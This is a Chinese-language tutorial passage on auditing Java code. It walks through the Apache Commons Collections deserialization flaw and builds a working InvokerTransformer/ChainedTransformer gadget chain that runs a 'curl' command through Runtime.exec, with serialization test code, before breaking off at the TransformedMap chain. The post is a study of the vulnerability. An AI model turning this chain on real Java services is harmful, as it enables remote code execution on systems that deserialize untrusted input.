从php代码审计到java代码审计还是有很大不同的,语言特性,漏洞产生的点等等,很多人都是php入门,同样我也是,但是说实话,java也是必须要掌握的,这里我选择分析一些经典的漏洞来熟悉java的代码审计,如果有理解错误的地方,希望得到师傅们的斧正。
#### Apache Commons Collections反序列化漏洞
首先利用`maven`进行自动下载下来包,看`/org/apache/commons/collections/functors/InvokerTransformer.class`
    public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
                } catch (NoSuchMethodException var5) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
                } catch (IllegalAccessException var6) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
                } catch (InvocationTargetException var7) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
                }
            }
        }
这个transform方法里面可以看到有个反射调用`return method.invoke(input,
this.iArgs);`,但是只有这里的话显然并不能RCE
继续看`/org/apache/commons/collections/functors/ChainedTransformer.class`
    public Object transform(Object object) {
            for(int i = 0; i < this.iTransformers.length; ++i) {
                object = this.iTransformers[i].transform(object);
            }
            return object;
        }
这里可以看出来是挨个遍历transformer,调用其的transform方法然后返回个object,返回的object继续进入循环,成为下一次调用的参数,怎么通过这里来执行命令呢,来看
    public static void main(String[] args)
        {
            Transformer[] transformers = {
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"curl http://127.0.0.1:10000"})
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            transformerChain.transform(Runtime.getRuntime());
        }
当传入`transformers`后进行
    public ChainedTransformer(Transformer[] transformers) {
            this.iTransformers = transformers;
        }
当传入`InvokerTransformer`后
    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) {
            this.iMethodName = methodName;
            this.iParamTypes = paramTypes;
            this.iArgs = args;
        }
这里都会赋值,然后这里就会调用到
    public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
                } catch (NoSuchMethodException var5) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' does not exist");
                } catch (IllegalAccessException var6) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' cannot be accessed");
                } catch (InvocationTargetException var7) {
                    throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass() + "' threw an exception", var7);
                }
            }
        }
到
    return method.invoke(Runtime.getRuntime(), new Object[] {"curl http://127.0.0.1:10000"});
执行命令,但是这是我们构造出来的,环境中不可能有`transformerChain.transform(Runtime.getRuntime());`
这样的操作,我们可以在`/org/apache/commons/collections/functors/ConstantTransformer.class`找到
    public ConstantTransformer(Object constantToReturn) {
            this.iConstant = constantToReturn;
        }
        public Object transform(Object input) {
            return this.iConstant;
        }
传入了个Object对象,然后transform方法原样返回,看代码
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    public class test {
        public static void main(String[] args)
        {
            Transformer[] transformers = {
                    new ConstantTransformer(Runtime.getRuntime() ),
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"curl http://127.0.0.1:10000"})
            };
            Transformer transformerChain = new test2(transformers);
            transformerChain.transform("aa");
        }
    }
    class test2 implements Transformer{
        private final Transformer[] iTransformers;
        public test2(Transformer[] transformers) { this.iTransformers = transformers; }
        public Object transform(Object object) {
            for(int i = 0; i < this.iTransformers.length; ++i) {
                System.out.println(object.getClass());
                object = this.iTransformers[i].transform(object);
            }
            return object;
        }
    }
这里我将ChainedTransformer类重写了一些,方便观察调试。
因为在`ConstantTransformer`中,调用transform方法时不管输入什么都不会影响返回,所以,随意输入即可。
那么能否直接这样构造进行序列化呢,编写代码试试
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import java.io.*;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    public class test {
        public static void main(String[] args)
        {
            Transformer[] transformers = {
                    new ConstantTransformer(Runtime.getRuntime() ),
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"curl http://127.0.0.1:10000"})
            };
            Transformer transformerChain = new test2(transformers);
            try{
                File f = new File("expobject");
                ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
                out.writeObject(transformerChain);
                out.flush();
                out.close();
            }catch (IOException e){
                e.printStackTrace();
            }
            try {
                FileInputStream f = new FileInputStream("expobject");
                ObjectInputStream oin = new ObjectInputStream(f);
                Transformer expobject = (Transformer)oin.readObject();
                expobject.transform("cc");
                System.out.println(expobject.getClass());
            }
            catch (FileNotFoundException e){
                e.printStackTrace();
            }catch (ClassNotFoundException e){
                e.printStackTrace();
            }catch (IOException e){
                e.printStackTrace();
            }
        }
    }
    class test2 implements Transformer, Serializable{
        private final Transformer[] iTransformers;
        public test2(Transformer[] transformers) { this.iTransformers = transformers; }
        public Object transform(Object object) {
            for(int i = 0; i < this.iTransformers.length; ++i) {
                System.out.println(object.getClass());
                object = this.iTransformers[i].transform(object);
            }
            return object;
        }
    }
可以看到实例化后的对象`Runtime`不允许序列化,那么我们继续修改
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import java.io.*;
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Method;
    public class test {
        public static void main(String[] args)
        {
            Transformer[] transformers = {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{ String.class, Class[].class}, new Object[]{"getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[]{ Object.class, Object[].class}, new Object[]{ null ,new Object[0]} ),
                    new InvokerTransformer("exec",
                            new Class[] {String.class },
                            new Object[] {"curl http://127.0.0.1:10000"})
            };
            Transformer transformerChain = new test2(transformers);
            try{
                File f = new File("expobject");
                ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
                out.writeObject(transformerChain);
                out.flush();
                out.close();
            }catch (IOException e){
                e.printStackTrace();
            }
            try {
                FileInputStream f = new FileInputStream("expobject");
                ObjectInputStream oin = new ObjectInputStream(f);
                Transformer expobject = (Transformer)oin.readObject();
                expobject.transform("cc");
                System.out.println(expobject.getClass());
            }
            catch (FileNotFoundException e){
                e.printStackTrace();
            }catch (ClassNotFoundException e){
                e.printStackTrace();
            }catch (IOException e){
                e.printStackTrace();
            }
        }
    }
    class test2 implements Transformer, Serializable{
        private final Transformer[] iTransformers;
        public test2(Transformer[] transformers) { this.iTransformers = transformers; }
        public Object transform(Object object) {
            for(int i = 0; i < this.iTransformers.length; ++i) {
                System.out.println(object.getClass());
                object = this.iTransformers[i].transform(object);
            }
            return object;
        }
    }
整个调用链是
    ((Runtime) Runtime.class.getMethod("getRuntime").invoke()).exec("curl http://127.0.0.1:10000")
简单整理下调用,不然不是很好理解
    object = ConstantTransformer.transform("cc");
    public Object transform(Object input) {
            return Runtime.class;
        }
    object = InvokerTransformer.transform(Runtime.class);
    Class cls = Runtime.class.getClass();
    Method method = cls.getMethod("getMethod", this.iParamTypes);
    return method.invoke("Runtime.class", "getRuntime");
    object = InvokerTransformer.transform(Runtime.class.getMethod("getRuntime"));
    Class cls = Runtime.class.getMethod("getRuntime").getMethod("getRuntime").getClass();
    Method method = cls.getMethod("invoke", this.iParamTypes);
    return method.invoke(Runtime.class.getMethod("getRuntime"), "getRuntime");
    object = InvokerTransformer.transform(Runtime.class.getMethod("getRuntime").invoke());
    Class cls = Runtime.class.getMethod("getRuntime").invoke().getMethod("getRuntime").getClass();
    Method method = cls.getMethod("exec", this.iParamTypes);
    return method.invoke(Runtime.class.getMethod("getRuntime").invoke(), "curl http://127.0.0.1:10000");
代码执行部分已经分析的差不多了,但是哪里有合适的构造点呢,根据网上的,我们来分析一下
##### 攻击链(一)
我们来看`/org/apache/commons/collections/map/TransformedMap.class`
    protected Object transformValue(Object object) {